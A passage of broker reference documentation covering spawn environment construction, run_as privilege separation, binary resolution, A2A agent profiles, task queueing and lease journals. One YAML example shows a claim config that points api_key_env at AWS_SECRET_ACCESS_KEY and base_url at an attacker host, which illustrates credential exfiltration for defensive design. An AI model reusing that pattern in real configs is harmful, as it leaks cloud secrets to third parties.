*names* — `api_key_env` and its equivalents — while the same config chooses
`base_url`. So an environment variable that reaches an instance is not merely
visible to it, it is postable anywhere by whoever claimed the lease:

```yaml
# a claim body's `config`, which the broker execs an instance against
core:
  models:
    default:
      provider: openai
      api_key_env: AWS_SECRET_ACCESS_KEY    # any variable the process holds
      base_url: https://attacker.example    # where its value gets sent
```

An allowlist of *known* provider key names cannot bound that, because the caller
picks the name. The broker therefore builds a spawn's environment from scratch
rather than inheriting its own, in this order (later wins, since `exec` resolves
a duplicated key to its last occurrence):

1. **The always-pass set** — `HOME`, `LANG`, `PATH`, `TZ` — taken from the
   broker's environment regardless of configuration. These are not credentials
   and are not optional: `HOME` is what resolves `~/.nexus`, so without it an
   instance cannot create a session directory and `-recall` has nothing to
   resume; `PATH` is what makes `exec` and the shell tool work at all; `TZ` and
   `LANG` decide how the instance renders times and text.
2. **Everything `inherit_env` names**, taken from the broker's environment. A
   name the broker does not hold is **skipped rather than exported empty** — an
   instance can tell "unset" from "set to the empty string", and a provider
   handed `api_key_env=""` fails less legibly than one that finds the variable
   absent.
3. **The selected entry's `env`** map, applied in sorted key order. This is the
   per-variant declaration point, and it *sets* a value rather than forwarding
   one, so it can also override something step 1 or 2 contributed.
4. **The three broker-owned variables** — `NEXUS_BROKER_ADDR`,
   `NEXUS_BROKER_LEASE_ID`, `NEXUS_BROKER_SPAWN_SECRET`. Last, always, so
   nothing an entry or the broker's shell contributes can point an instance at a
   different broker, hand it another lease's id, or supply its own spawn secret.

Steps 1–3 are emitted in sorted key order, so the environment a spawn is handed
is byte-identical across restarts.

At boot the broker logs **one line per registry entry** naming exactly the
variables that entry's spawns will carry — names only, never values:

```
level=INFO msg="binary registry entry" name=vision path=/opt/builds/nexus-vision \
  resolved_path=/opt/builds/nexus-vision \
  spawn_env=ANTHROPIC_API_KEY,HOME,LANG,NEXUS_BROKER_ADDR,NEXUS_BROKER_LEASE_ID,NEXUS_BROKER_SPAWN_SECRET,NEXUS_VISION,PATH,TZ
```

Because the line reports what will be **carried** rather than what was declared,
a name that is missing from it was never in the broker's own environment. Those
are also collected into one startup `WARN`:

```
level=WARN msg="inherit_env names variables this broker's own environment does not hold, ..." missing=ANTHROPIC_API_KEY
```

```yaml
# broker.yaml — forward two provider keys the broker was started with
inherit_env:
  - ANTHROPIC_API_KEY
  - OPENAI_API_KEY

binaries:
  vision:
    path: /opt/builds/nexus-vision
    env:
      NEXUS_VISION: "1"          # set outright, not forwarded
```

Use `inherit_env` when the value lives in the broker's own environment (a secret
injected by systemd, Kubernetes or a secrets agent) and `binaries.<name>.env`
when the value is a property of the variant. A claim's own `config` can of
course still carry a credential inline, in which case neither key is involved.

### Running instances as another user (`run_as`)

Without `run_as`, every claimed instance runs as the **broker's own uid** with
the broker's `HOME`. The process boundary between two claims is then not a
privilege boundary: one tenant's instance can read every other tenant's session
directory under `~/.nexus/sessions/`, and it can read `<state_dir>/spawn-key` —
which is enough to derive any live lease's dial-back secret and impersonate its
instance. `run_as` is what turns a separate process into a separate principal.

```yaml
# broker.yaml
run_as:                       # the default for every entry that declares none
  uid: 1500
  gid: 1500

binaries:
  vision:
    path: /opt/builds/nexus-vision
    run_as:                   # replaces the default outright — not merged
      uid: 1501
      gid: 1501

  support:
    path: /opt/builds/nexus-support
    run_as:
      uid: 1502
      gid: 1502
    env:
      HOME: /var/lib/nexus/support   # operator-set data dir; wins over the passwd home
```

- **Per entry over a broker default.** The interesting separation is between
  *variants*: a vision build and a support agent want to be apart from each
  other, not merely from the host. An entry that writes `run_as` replaces the
  broker-level block **wholesale** — a uid taken from one place and a gid from
  another is a credential nobody wrote down.
- **Both fields are required** whenever the block is written. A uid without a gid
  leaves instances in the broker's primary group, so their session files stay
  reachable from it — a boundary that looks complete in the config and is not one
  on disk.
- **Ids are numeric**, not user names. Resolving a name needs the passwd
  database, which a hardened container may not carry, and a name that resolves
  differently on two hosts is a silent privilege change.
- **`HOME` follows the credential.** `HOME` is what resolves `~/.nexus`, so an
  instance dropped to another uid while still pointed at the broker's home cannot
  create its session directory and every claim fails at the first write. The
  broker therefore resolves the `run_as` user's home from the passwd database at
  boot and gives the spawn that `HOME`; an entry's `env.HOME` overrides it and is
  the way to put instance state somewhere other than a home directory. A uid with
  no resolvable home and no `env.HOME` **fails startup**, naming the entry and
  the key that fixes it.
- **Sessions are consistent per registry entry.** Two entries running under
  different credentials keep their sessions in different trees. Resume stays
  correct because a session already records the entry that created it and a
  resume under a different entry is refused with **409** — see
  [Resume inherits the recorded binary](#resume-inherits-the-recorded-binary) —
  so a session can never be replayed under an entry whose `HOME` would not
  contain it.
- **Supplementary groups are dropped.** The child calls `setgroups(0, NULL)`, so
  it holds only the declared gid; keeping the broker's group memberships would
  leave the instance able to reach most of what the key exists to take away.

**The broker must be privileged.** Setting a child's credentials — including
dropping supplementary groups — requires **root**, or `CAP_SETUID` and
`CAP_SETGID` on Linux. This is true even when the `uid` named is the broker's
own. A broker configured with `run_as` that lacks the privilege logs one `WARN`
at boot:

```
level=WARN msg="run_as is configured but this broker does not run as root, ..." euid=501
```

and every claim that selects such an entry fails **at spawn**, immediately, with
**HTTP 500** `{"error":"spawning instance"}` and a broker-side log line naming
the refused credential — not a claim that hangs until the ready timeout.

Each entry's credential and resolved home appear in the boot log beside its path
and spawn environment:

```
level=INFO msg="binary registry entry" name=vision path=/opt/builds/nexus-vision \
  resolved_path=/opt/builds/nexus-vision spawn_env=… run_as=1501:1501 run_as_home=/home/nexus-vision
```

**What `run_as` does not do.** It separates instances from the broker's user and
from each other's user. It does not sandbox the filesystem, restrict the network,
or bound CPU and memory — a claim still supplies the whole engine config, and the
shell and file tools still run with whatever that uid can reach. Nor does it
protect an instance from the *claimant*: the caller who claimed a lease owns what
that instance does.

### Binary resolution

Every registry entry — including the reserved `nexus` one, and including the
value folded in from a deprecated `nexus_binary_path` — is resolved and verified
**once, at startup**, before the gateway listens. The steps, in order:

1. **Expand.** `~` and `~/…` are expanded through `ExpandPath`, as everywhere
   else in Nexus.
2. **Look up bare names on `PATH`.** A `path` containing no path separator is
   resolved against the broker process's own `PATH`. This is what makes the
   zero-config `path: "nexus"` work, and it is allowed for **every** entry, not
   just the reserved one.
3. **Make absolute.** The result is turned into an absolute path, so spawning is
   unaffected by the broker's working directory.
4. **Stat and check.** The path must exist, be a regular file (symlinks are
   followed), and carry at least one execute bit.

Any failure at any step **refuses the boot**, with an error naming the entry, the
path that was resolved, and the specific reason (`no such file`, `is a
directory`, `is not executable (mode …)`, `not found on PATH`). The resolved
absolute path is then held for the process lifetime, so a claim performs no
filesystem work and a `PATH` lookup cannot answer differently mid-flight.

At startup the broker logs one line per entry carrying both the configured
`path` and the `resolved_path`, so a surprising `PATH` answer — a stale build in
`~/go/bin` shadowing `/usr/local/bin` — is visible in the boot log rather than
inferred later from an instance behaving oddly.

> **Behaviour change.** A broker whose registry names a missing, non-executable,
> or directory path now **fails to start**. That includes a **zero-config broker
> with no `nexus` on its `PATH`**, which previously started fine and only failed
> at the first `POST /claim`. The tradeoff is deliberate and one-sided: a broker
> restarted midway through a variant rollout, while a binary is momentarily
> absent, will not come up — but an operator learns about a typo or a missing
> build at deploy time instead of from a user's failed claim.

### Agent profiles (`agents`)

An **agent profile** is one public agent this broker fronts: a Nexus config to
boot, a [binary registry](#binary-registry-binaries) entry to boot it with, and
the Agent Card that describes the result to the world. Each profile publishes its
own [A2A](https://a2a-protocol.org) endpoints under its own path namespace.

Profiles exist because [`POST /claim`](#post-claim-http-api-not-yaml) cannot be
an A2A front door: a claim carries the **full nexus config as inline YAML**,
which no third-party A2A client can supply — it does not know Nexus exists, let
alone which plugins to activate. A profile moves that decision broker-side, so
the client names an agent by URL and the operator decided long ago what running
that agent means.

> **Rejected alternative:** carrying the Nexus config through A2A
> `Message.metadata`. That works only for Nexus-aware clients, which defeats the
> point of speaking a standard protocol.

```yaml
agents:
  support:                                  # the name every route is namespaced under
    binary: nexus                           # optional; omitted means the reserved `nexus` entry
    config: "~/agents/support.yaml"         # ExpandPath applies here too
    card:
      name: "Support Agent"
      description: "Answers customer questions from the product knowledge base."
      version: "1.2.0"
      documentation_url: "https://acme.example/docs/support-agent"
      icon_url: "https://acme.example/icons/support.png"
      provider:
        organization: "Acme"
        url: "https://acme.example"
      default_input_modes: ["text/plain"]
      default_output_modes: ["text/plain"]
      skills:
        - id: "answer"
          name: "Answer questions"
          description: "Answers a customer question and cites its sources."
          tags: ["support", "qa"]
          examples: ["How do I rotate my API key?"]
  research:
    binary: vision                          # any entry of the binaries registry
    config: "~/agents/research.yaml"
    card:
      name: "Research Agent"
      description: "Reads documents and summarizes them."
      version: "0.1.0"
      skills:
        - id: "summarize"
          name: "Summarize"
          description: "Summarizes a supplied document."
```

| Profile field | Type   | Default             | Description |
|---------------|--------|---------------------|-------------|
| `binary`      | string | `nexus` (reserved)  | Which [`binaries:`](#binary-registry-binaries) entry this profile spawns. **Omitted means the reserved `nexus` entry**, exactly as an omitted `binary` on `POST /claim` does — an omitted binary has one meaning in this broker, not two. An **unknown** name is a **boot failure** naming the alternatives, not a fallback to `nexus`: quietly spawning the base binary for an agent an operator bound to a vision build produces a session that merely behaves oddly, which is far harder to diagnose than a refusal. |
| `config`      | string | *(required)*        | Path to the Nexus config file instances of this profile boot with. Funneled through `ExpandPath` (supports `~`), resolved to an absolute path and **stat()ed at boot**: a path that does not exist, is a directory, or cannot be read **fails startup** naming the profile. Its *contents* are not parsed here — whether it is a valid Nexus config is the engine's judgement, made by the instance that boots it. |
| `card`        | map    | *(required)*        | The hand-authored half of this profile's [Agent Card](#agent-card-agentsnamecard). Required: an A2A agent MUST publish a card, and the broker will not invent a name, description or skill list on an operator's behalf. |

**Profile names are URL path segments**, so they are validated more strictly than
binary registry names: letters, digits, `-`, `_` and `.` only, and not starting
with `.`. A name carrying a slash would silently restructure the route tree; one
carrying a space, colon or percent would round-trip differently through URL
encoding than through the card, so a client would dial a URL the broker never
registered. Names are compared with surrounding whitespace trimmed, so
`"support ":` and `support:` are a **duplicate** and fail the boot.

#### Agent Card (`agents.<name>.card`)

The keys are spelled exactly as [`nexus.io.a2a`](#nexusioa2a)'s inline `card:`
block spells them, so a card authored for a standalone serving instance pastes
in unchanged.

| Card field             | Type            | Default      | Description |
|------------------------|-----------------|--------------|-------------|
| `name`                 | string          | *(required)* | The agent's public name. |
| `description`          | string          | *(required)* | The agent's public description. |
| `version`              | string          | *(required)* | The **agent's** version, not the protocol's. |
| `documentation_url`    | string          | *(empty)*    | Human-readable documentation for this agent. |
| `icon_url`             | string          | *(empty)*    | Icon for client UIs. |
| `provider.organization`| string          | *(required when `provider` is present)* | The organization behind the agent. |
| `provider.url`         | string          | *(empty)*    | The provider's public URL. |
| `default_input_modes`  | list of string  | *(empty)*    | Media types the agent accepts when a message does not say otherwise. |
| `default_output_modes` | list of string  | *(empty)*    | Media types the agent produces when a message does not say otherwise. |
| `skills`               | list of object  | *(required, ≥1)* | The public capability listing. |
| `skills[].id`          | string          | *(required)* | Stable skill identifier. |
| `skills[].name`        | string          | *(required)* | Human-readable skill name. |
| `skills[].description` | string          | *(required)* | What the skill does. |
| `skills[].tags`        | list of string  | *(empty)*    | Free-form tags for discovery. |
| `skills[].examples`    | list of string  | *(empty)*    | Example prompts for this skill. |
| `skills[].input_modes` | list of string  | *(empty)*    | Per-skill override of `default_input_modes`. |
| `skills[].output_modes`| list of string  | *(empty)*    | Per-skill override of `default_output_modes`. |

**There are deliberately no keys for `supportedInterfaces`, `capabilities`,
`securitySchemes` or `securityRequirements`.** They are **derived** from what the
broker actually serves and overwrite anything a card source carried:

- `supportedInterfaces` — the profile's own JSON-RPC and HTTP+JSON URLs, absolute,
  built from the origin below. JSON-RPC leads, because the list is ordered by
  preference and it has the widest client support today. `tenant` is left
  **unset**: profiles do not share an endpoint URL, so the path segment already
  routes, and a second routing signal would have to be reconciled with it.
- `capabilities` — `streaming`, `pushNotifications` and `extendedAgentCard` all
  follow the set of operations the ingress actually implements. **`streaming` is
  `true`** (`SendStreamingMessage` is dispatched and the ingress starts a real
  instance to stream a turn from); **`pushNotifications` and
  `extendedAgentCard` are `false`** (see
  [A2A routes](#a2a-routes-http-api-not-yaml)).
- `securitySchemes` / `securityRequirements` — derived from the broker's
  [`auth:`](#authentication-auth) chain, one scheme and one requirement per
  validator, named with nexusauth's chain-order names (`static`, `jwks`,
  `jwks#2`). Separate requirement entries are the accurate translation of a
  first-success chain: satisfying **any** validator suffices. A `proxy_headers`
  validator is deliberately **not** advertised — it accepts no client credential,
  so publishing a scheme would tell clients to send a header guaranteed to be
  ignored. With no `auth:` block both fields are omitted entirely.

**The card's origin comes from `advertise_addr`.** A card must carry absolute
URLs, and `advertise_addr` is already the key that answers "where do clients
reach this broker" (`ws://` → `http://`, `wss://` → `https://`). With
`advertise_addr` unset the origin falls back to `listen_addr`, but **only when it
names a dialable host**: a wildcard bind (`:8080`, `0.0.0.0:8080`) with profiles
configured **fails startup** naming `advertise_addr`, because a card advertising
`http://:8080/agents/support/a2a` would be a confidently wrong answer handed to
every client that fetches it.

#### A2A routes (HTTP API, not YAML)

Each profile publishes three routes, namespaced under its own name so profiles
cannot collide and nothing can shadow an existing broker route (none of which
starts with `/agents/`):

| Route | Purpose |
|-------|---------|
| `GET`/`HEAD /agents/<profile>/.well-known/agent-card.json` | The profile's Agent Card. Served with `ETag` and `Cache-Control: public, max-age=300`; a conditional request with `If-None-Match` answers **304**. |
| `POST /agents/<profile>/a2a` | The JSON-RPC 2.0 binding. |
| `/agents/<profile>/a2a/v1/...` | The HTTP+JSON (REST) binding, including A2A's custom verbs (`/tasks/{id}:cancel`). |

The card is published **per profile** rather than at the origin's well-known URI
because [specification §8.2](https://a2a-protocol.org) scopes that URI to an
origin, which can name exactly one agent. A broker fronts several, so each card
lives under its profile and advertises its own absolute URLs; a client handed a
profile's card URL — §8.2's "Direct Configuration" — needs nothing else.

**Every A2A route is behind the broker's [`auth:`](#authentication-auth) guard,
the card included.** A refusal is the broker's standard envelope
(`{"error":"authentication required"}`, `401`/`403`/`503` with the usual
`WWW-Authenticate` challenge) — the same middleware, and the same answer, that
`POST /claim` gives. This differs from [`nexus.io.a2a`](#nexusioa2a), which
serves its card unauthenticated: that plugin binds loopback by default, whereas
the broker is an ingress whose standing policy is that even `GET /binaries`
requires a credential. Clients are given a credential out-of-band before they
fetch the card, which §8.2 explicitly sanctions. A broker with no `auth:` block
serves the card to everyone, exactly as it serves every other route.

**`SendMessage`, `SendStreamingMessage` and `CancelTask` are dispatched.** A
client's message becomes the `input` payload a leased instance's
[`nexus.io.broker`](#nexusiobroker) plugin turns into `io.input`, and everything
the instance sends back is translated into A2A frames — see
[the session broker guide](../guides/session-broker.md#what-the-a2a-ingress-translates)
for the payload-by-payload mapping.

**`GetTask`, `ListTasks` and `SubscribeToTask` are dispatched too**, served from
the broker's durable [task store](#a2a-task-retention-a2atasks) rather than from
memory — which is why they can be answered at all after the instance that ran a
task has been released or the broker has restarted, precisely when a client asks.
Every one of them is scoped to the authenticated principal **and to the profile
it was addressed to**: a task belonging to another caller — or to another profile
— is **byte-for-byte the same refusal as one that never existed**
(`TaskNotFoundError`), because a distinct "exists but is not yours" answer is an
existence oracle for ids the caller was never told. The profile is part of the
key for the same reason it is part of a conversation's: two profiles are two
different public agents with two different configs, so `ListTasks` on one must
not list the other's conversations. `ListTasks` supports
`contextId`, `status` and `statusTimestampAfter` filters, `historyLength`,
`includeArtifacts` (default `false`) and keyset pagination via `pageSize` /
`pageToken`; a `pageToken` this broker did not mint is an `InvalidParamsError`
rather than a silent restart from the top.

`capabilities.streaming` on every profile card is `true` as a result, because it
is derived from this operation set rather than configured — both
`SendStreamingMessage` and `SubscribeToTask` are dispatched.

**The push notification operations and `GetExtendedAgentCard` are still
refused**, with `UnsupportedOperationError` (JSON-RPC code `-32004` with HTTP
`200`; REST `400` with a `FAILED_PRECONDITION` google.rpc.Status body) carrying
`detail: OPERATION_NOT_IMPLEMENTED` to say "not yet" rather than "never". Both
matching card capabilities are `false`.

The routes authenticate, decode and validate whatever the operation: a malformed
JSON-RPC envelope is still told it is malformed. A path naming no configured
profile is a **404** in the binding's own error shape, never a fallback to some
default agent.

**A message starts, reuses or resumes an instance, and the client is told
none of it** — see [Conversation lifecycle](#conversation-lifecycle-contextid)
below for the four cases, the failure states and the response latency each one
implies.

**A broker built without an instance provider answers `InternalError`** carrying
`detail: INSTANCE_PROVIDER_NOT_WIRED`, and logs a warning at boot naming the
missing piece. That is not a state a shipped `nexus-broker` binary can be in —
`run()` always installs the lifecycle when `agents:` is configured — but the
refusal exists so an embedder that assembles the ingress itself gets a specific,
actionable answer rather than a nil-pointer panic.

#### Conversation lifecycle (`contextId`)

An A2A client holds a **`contextId`** and nothing else. The broker holds leases.
The client never learns the second thing exists, because the ingress owns the
whole mapping between them:

```
contextId ──(durable index)──▶ engine session id ──(the /claim spawn spine)──▶ lease
```

The middle term is what makes it work. A lease is mortal — it is released when a
conversation goes quiet and it dies when its instance crashes — but an engine
session is a directory on disk that outlives every process that opened it. A
message on a context whose instance is gone is therefore not an error to report;
it is a session to resume.

| What the broker knows about the `contextId` | What a message does |
|---|---|
| Nothing (new conversation, or no `contextId` at all — one is minted) | Spawns an instance with **no** `-recall`, waits for dial-back and ready, then runs the turn. |
| A live instance | Routes the turn to it. History is whatever the running engine holds — nothing is replayed. |
| A live lease already running the context's session, that this process lost track of (a **restart** with a surviving instance) | **Adopts** it rather than spawning a second engine over one session directory. |
| A session with no live lease (idle-released, crashed, or a restart) | Spawns a new instance with **`-recall <session id>`** so the engine replays the history. The client is not told the instance ever stopped. |

**Continuity is keyed by `(principal, profile, contextId)`, not by `contextId`
alone.** A2A lets a client choose its own `contextId`, so keying on it alone
would let any caller name another caller's conversation and be handed that
session's history. A colliding `contextId` under a different principal — or a
different profile — resolves to the caller's **own** binding instead: no leak, no
oracle, and no overwrite of the real owner's entry. With no `auth:` block every
caller is the same anonymous principal, exactly as lease ownership already
behaves.

**The binding is durable but not permanent.** It lives in
[`<state_dir>/a2a-contexts.jsonl`](#a2a-context--session-index-a2a-contextsjsonl),
which is capped at 4096 bindings with the oldest dropped first. A conversation
whose binding was evicted — or any conversation at all, on a broker with no
`state_dir`, once the process restarts — reads back as *unknown*, so the next
message on it starts a **fresh session** and nothing tells the client its history
was left behind.

**The instance is NOT released at the end of a turn.** It is an ordinary lease
from the moment it is created: it appears in `GET /leases`, it is owned by the
A2A caller, it counts against `max_concurrent`, `POST /release` tears it down,
the crash watcher covers it, and **`idle_timeout` reaps it** when the
conversation goes quiet. Every A2A message the broker sends to it resets the idle
timer, exactly as a WebSocket client's input does. Releasing per turn was
rejected: it would make every message a cold boot.

**A spawn that does not produce an instance settles the task, never hangs.** The
failure is answered as a terminal A2A **task state** rather than as a protocol
error, because a client that asked an agent a question deserves an answer in the
vocabulary it already speaks:

| Condition | Task state | Why |
|---|---|---|
| The profile's `binary` is not in the registry; the context's session was created by a different binary; the profile's `config` file cannot be read or is empty | `TASK_STATE_REJECTED` | The broker refused the request. Nothing was attempted, and the same message will fail the same way until an operator changes something. |
| The instance exited while booting, never signalled ready inside the ready timeout, or the broker is at capacity | `TASK_STATE_FAILED` | The spawn was attempted and did not come up. A retry may succeed. |
| A surviving instance is mid-reattach after a restart | `TASK_STATE_FAILED` | Spawning now would put a second engine on one session directory. Retry once the instance has reconnected. |

The terminal status carries a message explaining what happened **without naming a
lease**, because a lease is not a concept an A2A client has.

**Response latency.** The two internal timeouts a `/claim` caller already waits
on apply unchanged to the *first* message of a conversation and to the message
that re-spawns one:

| Bound | Value | Effect on an A2A response |
|---|---|---|
| Ready wait | 30s | A cold spawn blocks the A2A request until the instance signals ready. In the worst case the client waits 30s and then receives a `FAILED` task. |
| Session-report grace | 5s | After ready, the broker waits up to 5s for the instance's session id. It is **not** on the answer path for the turn: a report that never arrives only costs the conversation its durable binding, so a later resume starts a fresh session rather than replaying. |

Both are constants, not config keys: they bound the broker's own handshake with a
process it started, not a policy an operator tunes. A **second** message on a
live conversation pays neither — it goes straight to the running instance — which
is the whole reason the instance is kept alive between turns.

#### Serial task queueing

**A conversation runs one task at a time.** A Nexus instance runs one agent
loop, and two `input` payloads sent to it while a turn is in flight do not
produce two turns — they interleave into whatever the loop does next. So a second
message on a `contextId` whose task is still live is *accepted* and *queued*: it
sits in `TASK_STATE_SUBMITTED`, with nothing sent to any instance, until the
task ahead of it is terminal, and then moves to `TASK_STATE_WORKING`.

`TASK_STATE_SUBMITTED` is the honest rendering — [§3.1.1](https://a2a-protocol.org)
defines it as "accepted, not yet started", which is exactly a queued turn. A
queued task is a complete task: it has an id, it can be read with `GetTask`,
streamed with `SubscribeToTask`, and cancelled with `CancelTask`.

The queue is keyed by **(caller, profile, `contextId`)** — the same key the
instance is filed under — so two conversations never wait on each other, and two
principals using the same `contextId` get two instances and two queues.

It advances on exactly one event: **a task reaching a terminal state**. Every way
a turn can end funnels through there, so the queue survives things going wrong:

| What happens | What the queue does |
|---|---|
| The turn completes, fails or is cancelled | The next task is promoted and starts. |
| The instance is released while idle, or crashes | The active task settles at `FAILED`; the next task is promoted and **acquires a fresh instance**, which resumes the conversation from its session. |
| A queued task is cancelled before it starts | It leaves the queue; nothing else is disturbed and the task behind it still runs. |
| The active task parks at `TASK_STATE_INPUT_REQUIRED` | It **keeps** the queue: the agent loop is blocked inside `ask_user`, so starting the next turn would send input to an instance that cannot read it. `a2a.tasks.input_timeout` is what stops that being a deadlock — see below. |

A promoted turn is **detached from the request that submitted it**: a client that
hangs up while queued has not withdrawn its message, and can read the result with
`GetTask` or reattach with `SubscribeToTask`.

#### A2A task retention (`a2a.tasks`)

Every A2A task the broker runs is recorded in `<state_dir>/a2a-tasks.jsonl`, in
the same append-and-compact shape as the [lease journal](#lease-durability-state_dir)
and the [A2A context index](#a2a-context--session-index-a2a-contextsjsonl)
(`a2a-contexts.jsonl`). One
mechanism, one failure policy, one thing for an operator to know about a
`state_dir` — a database for this one file was rejected on those grounds.

The record is what makes `GetTask`, `ListTasks` and `SubscribeToTask` answer
after the instance is gone. It carries the task's identity, its current status
and status message, its response artifact and a bounded trail of the messages the
client sent, keyed by **owner first** so a task is not reachable without a
principal, and scoped to the **profile** it was addressed to.

**With no `state_dir` the store is memory-only**: every read still answers for
the life of the process, and nothing survives a restart. The reads refusing would
be a far worse degradation than losing them across a restart, which is what such
a broker has already chosen for its leases.

**A task left in flight by a stopped broker is settled at `TASK_STATE_FAILED`
when the store opens**, with a status message saying the broker stopped. Leaving
it as it stood would show a client `WORKING` for ever, and would make the record
immortal — only terminal tasks are evictable, so a crash loop would accumulate
records that count against the cap and push real tasks out of it.

**Retention is load-bearing, not housekeeping.** A broker records a task for
every turn every client ever runs, so an unbounded policy would grow with
*traffic* rather than with any one conversation:

| Bound | Value | Configurable | Why this number |
|---|---|---|---|
| `a2a.tasks.ttl` | `24h` | yes (`"0s"` disables) | A task is only useful to a client that still holds its id, and a client that has been away for a day has restarted, retried or given up. A day is also far longer than any plausible reconnect window, so the TTL never expires a task somebody is still following. It matches [`nexus.io.a2a`](#nexusioa2a)'s default deliberately: the same client talking to the same agent must not find its history disappearing on a different schedule depending on whether a broker is in front of it. |
| `a2a.tasks.max_per_context` | `50` | yes (`0` disables) | 50 turns of readable history per conversation is far more than a client polls back over. It is **lower** than `nexus.io.a2a`'s 200 because a standalone listener serves exactly one context — its per-context cap is also its total — whereas a broker holds every conversation at once, so the number multiplies. |
| Total tasks retained | `2048` | no | The backstop that makes the store's footprint statable: the per-context cap alone bounds nothing when the number of contexts is unbounded. Eviction takes the **oldest terminal** records first. |
| Stored text per artifact or message | `16 KiB` | no | The store's real growth term. A turn's answer is unbounded and the record is rewritten on each transition, so an uncapped answer would be written several times at whatever size it happened to be. 16 KiB is roughly four thousand words. It is not a config key because it is a property of this storage substrate rather than a deployment choice. |

Two consequences worth stating plainly:

- **Only the stored copy is truncated.** A client attached while the turn ran
  received the whole answer; a truncated stored copy carries a marker saying so,
  so a later `GetTask` cannot mistake an excerpt for the whole.
- **Streamed deltas are never stored.** A record is written only when a task
  changes state or publishes an artifact, so a turn that streams thousands of
  chunks writes the same handful of lines a one-word turn does. The store scales
  with the *shape* of a turn, not its volume.

`a2a.tasks.input_timeout` (default `15m`, `"0s"` disables) is the third knob and
is not about storage at all: it bounds how long a task may sit at
`TASK_STATE_INPUT_REQUIRED`. A parked task holds its leased instance **and** its
conversation's [serial queue](#serial-task-queueing), because the agent loop that
asked the question is blocked inside `ask_user`. On expiry the task is driven to
`TASK_STATE_FAILED` — a real terminal transition that closes every attached
stream and frees the queue — and the instance is sent a cancellation so its loop
unblocks. Fifteen minutes is chosen against a human: a question routed to a
person has to survive being paged, read, thought about and answered. Setting
`"0s"` removes the deadline, and with it the guarantee that a queue behind an
unanswered question ever moves.

### Lease durability (`state_dir`)

Lease state is live-process bookkeeping: which instances this broker spawned,
who claimed them, and what session each is running. Without `state_dir` it lives
only in memory, so a broker restart loses all of it and the `nexus` processes it
spawned become orphans nobody can account for. Setting `state_dir` makes it
durable.

This is **not** session continuity — that is already solved by
`~/.nexus/sessions/<id>/` plus `-recall`, and a released instance's session
directory is intact and resumable whether or not `state_dir` is set.

```yaml
state_dir: "~/.nexus/broker"     # per-broker; never shared between brokers
broker_id: ""                    # optional; generated + persisted when empty
```

**Format.** `<state_dir>/leases.jsonl` is an append-only JSONL journal, one JSON
object per line. There is no database and no migrations — the broker is a
standalone binary, not an engine plugin, so the per-plugin SQLite storage is not
available to it. A record is written when a lease is **minted**
(`lease-created`), when its pid or session id first becomes knowable
(`lease-updated`, which supersedes the earlier record for the same `lease_id`),
and when it is **torn down** (`lease-released`). The release record is written
from the single point all three teardown reasons converge on, so a manual
`POST /release`, an idle sweep and a **crash** are all recorded.

Each record carries `lease_id`, `owner` (the claiming principal's `id`, `tenant`
and `scopes`), `session_id`, `binary`, `pid`, `broker_id`, `advertise_addr` —
verbatim as configured, so a record round-trips what is in `broker.yaml` — and
`created_at` / `released_at` / `reason`.

`binary` is the [`binaries`](#binary-registry-binaries) entry **name** the instance was spawned
from — the name, not the path, so the record still identifies the variant after
the entry is repointed at a new build. It is omitted when empty, which is what a
journal written by a broker predating the field looks like; such a record still
loads, and an absent `binary` means *not recorded*, never "the binary named empty
string". The lease journal's copy is only good while the lease is live — a
released lease is dropped by compaction — so the durable mapping lives in a
separate file, described next.

**No secret is ever written.** Not the lease's per-spawn secret, not a client
WebSocket ticket, not a bearer token. The owner's **raw claim set** is
deliberately not persisted either — `id`, `tenant` and `scopes` are what
ownership and scoped listing need, and the full claim set stays in the broker's
`slog` audit trail. (The `spawn-key` file beside the journal is a *derivation
key*, not a credential: presenting its contents to `WS /instance` authenticates
nothing. See [Restart recovery](#restart-recovery-reattach_window).)

**Growth is bounded** by compaction, in two passes over the same rewrite: the
journal is compacted **when it is opened**, and again **every 512 appends**. A
compaction rewrites the file to hold exactly the leases that are still live, one
record each, via a temp file and an atomic rename — so a crash mid-compaction
leaves the previous journal intact. At any moment the file holds at most
(live leases + 512) records, however many leases have come and gone.

**Failure handling.** A journal write that fails is **logged and otherwise
ignored**: it never fails a claim or a release, because durability must not
become a new way for the broker to refuse service. A record that was being
written when the broker was killed leaves a torn final line; the reader **skips
it with a warning** and keeps every complete record before it, and the
rewrite-on-open truncates it away. An unreadable or malformed line anywhere in
the file is skipped the same way rather than failing the whole file.

Multi-broker cooperation is **not** implemented: no broker reads another's
journal, there is no shared store, and there is no routing. `broker_id` and
`advertise_addr` are stamped on every record now so that a future shared backend
needs no data migration.

### Session → binary index (`session-binaries.jsonl`)

`<state_dir>/session-binaries.jsonl` records which
[`binaries`](#binary-registry-binaries) entry served each engine session, so a
resume can be checked against the build that created the session. It is a
**separate file from the lease journal on purpose**: the journal is compacted down
to the leases that are still live, and a resume always arrives *after* the
original lease was released, so a binding kept only there would be gone precisely
when it is wanted.

**Format.** Append-only JSONL, one object per line, with three fields —
`session_id`, `binary` (the entry **name**, never the path) and `at` (when the
pairing was last recorded, used only for pruning). A later line for the same
`session_id` supersedes an earlier one. **No secret is ever written**, for the
same reasons as the lease journal.

**When a line is written.** At **claim time** for a resume, where the session id
arrives in the request body, and on the **session-id report** for a new session,
where the id is not knowable any earlier. Re-recording an unchanged pairing does
not append — a session resumed many times costs one line, not one per resume. An
empty `binary` is never written: empty means *not recorded*.

**Growth is bounded** by an entry cap of **4096 bindings**, applied when the file
is rewritten — on open, and again every 256 appends — via a temp file and an
atomic rename. A cap is required here and compaction alone would not be enough:
nothing ever retires a binding (outliving its lease is the whole point), so
without one the file would grow by a line per distinct session forever. When the
cap is exceeded the **oldest** bindings are dropped.

**It is best-effort, and that is deliberate.** An unknown session is an ordinary
answer meaning *no opinion, proceed* — never a mismatch. A session predating this
file, a session whose binding was pruned, and a broker running without a
`state_dir` all resume exactly as they did before the index existed. What a
*found* binding is enforced as on a claim is described under
[Resume inherits the recorded binary](#resume-inherits-the-recorded-binary).

**Failure handling.** Malformed, torn or partially-written lines are **skipped
with a warning** and every good line before them is kept; the rewrite-on-open
truncates the damage away. A corrupt index **never prevents the broker from
booting**. Unlike the lease journal, an index that cannot be opened at all is
**not** a boot failure either — it logs a `WARN` and the broker runs with the
index off, because refusing to serve would trade an advisory check for an outage.
A write that fails is logged and otherwise ignored: it never fails a claim.

### A2A context → session index (`a2a-contexts.jsonl`)

`<state_dir>/a2a-contexts.jsonl` records which engine session serves each
[A2A conversation](#conversation-lifecycle-contextid), so a message on a
`contextId` whose instance is gone re-spawns onto the **same** session with
`-recall` instead of starting a new one. It is written **only when `agents:` is
configured**, and it is a third file rather than part of either of the two above:
